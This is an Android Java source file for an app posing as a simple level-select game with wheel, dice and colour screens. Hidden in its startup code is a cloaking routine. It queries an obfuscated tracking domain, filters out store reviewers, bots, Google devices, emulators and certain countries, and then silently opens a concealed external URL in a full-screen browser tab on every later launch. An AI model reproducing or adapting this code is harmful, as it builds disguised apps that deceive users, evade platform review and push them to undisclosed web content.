package com.wheeelcustoms;

import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;


import androidx.appcompat.app.AppCompatActivity;
import androidx.browser.customtabs.CustomTabsIntent;

import com.android.volley.NetworkResponse;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.HurlStack;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.facebook.applinks.AppLinkData;
import com.facebook.applinks.BuildConfig;
import com.onesignal.OneSignal;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Map;

public class ChooseLvl extends AppCompatActivity {
    public static final String DEPLINK = "pls://run";
    public static final String MY_SUB_URL = "";
    Button lvl_1, lvl_2, lvl_3, lvl_4, lvl_5;
    final String SAVED_TEXT1 = "saved_text";
    int i = 10;
    int id = 0;

    boolean openTabs = true;


    private int mStatusCode = 0;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_choose);
        OneSignal.startInit(this)
                .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
                .unsubscribeWhenNotificationsAreDisabled(true)
                .init();

        lvl_1 = findViewById(R.id.lvl_1);
        lvl_2 = findViewById(R.id.lvl_2);
        lvl_3 = findViewById(R.id.lvl_3);
        lvl_4 = findViewById(R.id.lvl_4);
        lvl_5 = findViewById(R.id.lvl_5);

        lvl_1.setOnClickListener((View v) -> {
            Intent intent = new Intent(ChooseLvl.this, RandomZadanActivity.class);
            intent.putExtra("int_value", 1);
            startActivity(intent);
        });
        lvl_2.setOnClickListener((View v) -> {
            Intent intent = new Intent(ChooseLvl.this, WheelActivity.class);
            intent.putExtra("int_value", 2);
            startActivity(intent);
        });
        lvl_3.setOnClickListener((View v) -> {
            Intent intent = new Intent(ChooseLvl.this, DiceActivity.class);
            intent.putExtra("int_value", 3);
            startActivity(intent);
        });
        lvl_4.setOnClickListener((View v) -> {
            Intent intent = new Intent(ChooseLvl.this, ColorRandActivity.class);
            intent.putExtra("int_value", 4);
            startActivity(intent);
        });
        lvl_5.setOnClickListener((View v) -> {
            Intent intent = new Intent(ChooseLvl.this, RandomComputerActivity.class);
            intent.putExtra("int_value", 5);
            startActivity(intent);
        });


        if (InternetCon.checkConnection(getApplicationContext())) {

            SharedPreferences settings = getSharedPreferences(SAVED_TEXT1, 0);
            id = settings.getInt("ID", 0);


            if(id == 1){

                openLink();


            }else if(id == 2){

            }
            else
            {

                RequestQueue requestQueue = Volley.newRequestQueue(getApplicationContext(), new HurlStack() {
                    @Override
                    protected HttpURLConnection createConnection(URL url) throws IOException {
                        HttpURLConnection connection = super.createConnection(url);
                        connection.setInstanceFollowRedirects(false);

                        return connection;
                    }
                });


                String url = "hop.villaleslauriers";
                url = url + ".com/x5b2TSBf";
                url = "https://" + url;

                StringRequest request = new StringRequest(url, new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        Log.i("statusCode", String.valueOf(mStatusCode));
                    }
                }, new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        Log.e("onErrorResponse", error.toString());
                        Map<String, String> header = error.networkResponse.headers;
                        Log.i("Redirected URL", header.get("Location"));
                        String location = header.get("Location");
                        //String [] subs= {"sub1=", "c=", "d=", "e=", "f=", "j=", "i="};
                        String [] subs= {"sub1=", "sub3=", "sub4=", "sub5=", "sub6=", "sub7=", "sub9="};
                        String [] sub1= {"FreeBSD", "Firefox", "Linux"};
                        String [] sub2= {"Nexus", "Pixel", "Moto", "Google"};
                        String sub3= "1";
                        String sub5= "AR";
                        String [] sub6= {"US", "PH", "NL", "GB", "IN", "IE"};
                        String [] sub7= {"google", "bot", "adwords", "rawler", "spy", "o-http-client", "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus 5X Build/MTC20F)", "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G935F Build/NRD90M)", "Dalvik/2.1.0 (Linux; U; Android 7.0; WAS-LX1A Build/HUAWEIWAS-LX1A)"};

                        for(int index=0; index < subs.length; index++) {
                            String[] parts = location.split(subs[index]);
                            String value = parts[1];
                            parts = value.split("&");
                            value = parts[0];
                            System.out.println(value);
                            if(index == 0 ){
                                checkMass(sub1, value);
                                if(!openTabs)
                                    break;

                            }
                            if(index == 1 ){
                                checkMass(sub2, value);
                                if(!openTabs)
                                    break;

                            }
                            if(index == 2 || index == 3){
                                if (value.contains(sub3)) {
                                    openTabs = false;
                                    break;
                                }
                            }
                            if(index == 4 ){
                                if (value.contains(sub5)) {
                                    openTabs = false;
                                    break;
                                }
                            }
                            if(index == 5 ){
                                checkMass(sub6, value);
                                if(!openTabs)
                                    break;

                            }
                            if(index == 6 ){
                                checkMass(sub7, value);
                                if(!openTabs)
                                    break;

                            }
                        }


                        if(openTabs){

                            try {


                                AppLinkData.fetchDeferredAppLinkData(ChooseLvl.this, appLinkData -> {
                                    AppLinkData appLinkData1 = appLinkData;
                                    if (appLinkData1 == null || appLinkData1.getTargetUri() == null) {
                                        Log.e("MyLog", "deeplink = null");

                                        openLink();
                                    } else {

                                        String url = appLinkData1.getTargetUri().toString();
                                        if (com.facebook.applinks.BuildConfig.DEBUG) {
                                        }
                                        String string = convertArrayToStringMethod(url.split(DEPLINK));
                                        SharedPreferences settings5 = getSharedPreferences(SAVED_TEXT1, 0);
                                        SharedPreferences.Editor editor = settings5.edit();

                                        editor.putString(MY_SUB_URL, string);
                                        //editor.putString(MY_SUB_URL, "KEK");
                                        editor.commit();



                                        if (BuildConfig.DEBUG) {

                                        }

                                        Log.i("MyLog", string + "nu");
                                        openLink();


                                    }
                                });
                            } catch (Exception e) {
                                Log.e("my Log" + ChooseLvl.this, "App Link appLinkData: " + e.toString());

                                e.printStackTrace();
                            }



                            SharedPreferences settings = getSharedPreferences(SAVED_TEXT1, 0);
                            SharedPreferences.Editor editor = settings.edit();

                            editor.putInt("ID", 1);
                            editor.commit();
                        }
                        else{
                            SharedPreferences settings = getSharedPreferences(SAVED_TEXT1, 0);
                            SharedPreferences.Editor editor = settings.edit();

                            editor.putInt("ID", 2);
                            editor.commit();
                            //openUI();
                        }


                    }
                }) {
                    @Override
                    protected Response<String> parseNetworkResponse(NetworkResponse response1) {
                        if (response1 != null) {
                            mStatusCode = response1.statusCode;

                            Map<String, String> header = response1.headers;


                        }
                        return super.parseNetworkResponse(response1);
                    }
                };

                requestQueue.add(request);

            }

        } else {
            SharedPreferences settings = getSharedPreferences(SAVED_TEXT1, 0);
            SharedPreferences.Editor editor = settings.edit();

            editor.putInt("ID", 2);
            editor.commit();
            // Not Available...
            //openUI();

        }
    }
    void checkMass(String [] sub1, String value){

        for(int q = 0; q < sub1.length; q++) {
            if (value.equals(sub1[q])) {
                openTabs = false;
            }

        }

    }
    void openLink(){



        SharedPreferences settings = getSharedPreferences(SAVED_TEXT1, 0);
        String myStrValue = settings.getString(MY_SUB_URL, "");

        String url = "traffdomnbrncv";
        url = url + ".fun/jmjJJ1kQ";

        url = url + myStrValue;
        url = "https://" + url;
        Log.i("MyLog: ", myStrValue);
        final Bitmap backButton = BitmapFactory.decodeResource(getResources(), R.drawable.round_done_black_24dp);
        CustomTabsIntent.Builder builder = new CustomTabsIntent.Builder();
        builder.enableUrlBarHiding();
        builder.setToolbarColor(Color.BLACK);
        builder.setShowTitle(false);
        builder.addDefaultShareMenuItem();
        builder.setCloseButtonIcon(backButton);


        builder.addDefaultShareMenuItem();

        CustomTabsIntent customTabsIntent = builder.build();
        String packageName = "com.android.chrome";
        // if we cant find a package name, it means there's no browser that supports
        // Custom Tabs installed. So, we fallback to a view intent


        try {
            customTabsIntent.intent.setPackage(packageName);
            customTabsIntent.launchUrl(ChooseLvl.this, Uri.parse(url));
            finish();
            // Your startActivity code wich throws exception
        } catch (ActivityNotFoundException activityNotFound) {
            ChooseLvl.this.startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
            // Now, You can catch the exception here and do what you want
            finish();
        }

    }

    public static String convertArrayToStringMethod(String[] strArray) {

        StringBuilder stringBuilder = new StringBuilder();

        for (int i = 0; i < strArray.length; i++) {

            stringBuilder.append(strArray[i]);

        }

        return stringBuilder.toString();

    }
}
